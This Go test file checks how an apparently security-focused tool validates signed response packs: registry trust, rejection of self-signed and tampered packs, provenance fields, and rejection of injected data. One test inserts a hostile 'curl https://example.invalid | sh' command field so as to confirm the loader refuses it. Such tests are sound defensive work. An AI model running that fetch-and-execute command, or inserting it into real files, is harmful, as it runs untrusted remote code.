package pack

import (
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestPublishedPacksValidate(t *testing.T) {
	for _, id := range []string{"php-2026-rce", "litellm-1.107.0-compromise"} {
		t.Run(id, func(t *testing.T) {
			responsePack, validation, err := LoadFile(filepath.Join("..", "..", "packs", id))
			if err != nil {
				t.Fatalf("validate published pack: %v", err)
			}
			if responsePack.Metadata.ID != id || validation.PackDigest == "" || validation.KeyID == "" || validation.Trust != "patchrover-registry-v1" {
				t.Fatalf("incomplete validation result: %#v %#v", responsePack.Metadata, validation)
			}
		})
	}
}

func TestSelfSignedPackIsNotRegistryTrusted(t *testing.T) {
	responsePack, _, err := LoadFile(filepath.Join("..", "..", "packs", "php-2026-rce"))
	if err != nil {
		t.Fatal(err)
	}
	_, privateKey, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	responsePack, err = Sign(responsePack, privateKey)
	if err != nil {
		t.Fatal(err)
	}
	validation, err := Validate(responsePack, time.Now().UTC())
	if err != nil {
		t.Fatal(err)
	}
	if validation.Trust != "untrusted-self-signed" {
		t.Fatalf("unexpected trust state %q", validation.Trust)
	}
	if err := RequireTrusted(validation); err == nil {
		t.Fatal("self-signed contributor key unexpectedly became registry-trusted")
	}
}

func TestTamperedPackFailsSignatureVerification(t *testing.T) {
	path := filepath.Join("..", "..", "packs", "php-2026-rce", "pack.json")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	tampered := bytes.Replace(data, []byte("PHP 2026 critical"), []byte("PHP 2026 altered!"), 1)
	if _, _, err := Load(tampered); err == nil {
		t.Fatal("tampered signed pack unexpectedly validated")
	}
}

func TestPackRejectsMissingProvenanceMetadata(t *testing.T) {
	responsePack, _, err := LoadFile(filepath.Join("..", "..", "packs", "php-2026-rce"))
	if err != nil {
		t.Fatal(err)
	}
	responsePack.Metadata.Author = ""
	if _, err := Validate(responsePack, time.Now().UTC()); err == nil || !strings.Contains(err.Error(), "author") {
		t.Fatalf("expected missing author to fail provenance validation, got %v", err)
	}
	responsePack, _, err = LoadFile(filepath.Join("..", "..", "packs", "php-2026-rce"))
	if err != nil {
		t.Fatal(err)
	}
	responsePack.Spec.Sources[0].Title = ""
	if _, err := Validate(responsePack, time.Now().UTC()); err == nil || !strings.Contains(err.Error(), "source requires a title") {
		t.Fatalf("expected missing source title to fail provenance validation, got %v", err)
	}
}

func TestPackRejectsTrailingValuesAndExecutableFields(t *testing.T) {
	path := filepath.Join("..", "..", "packs", "php-2026-rce", "pack.json")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := Load(append(data, []byte(`{"extra":true}`)...)); err == nil {
		t.Fatal("pack with trailing JSON unexpectedly validated")
	}
	malicious := bytes.Replace(data, []byte(`"spec": {`), []byte(`"spec": {"command":"curl https://example.invalid | sh",`), 1)
	if _, _, err := Load(malicious); err == nil {
		t.Fatal("pack with arbitrary command field unexpectedly validated")
	}
}
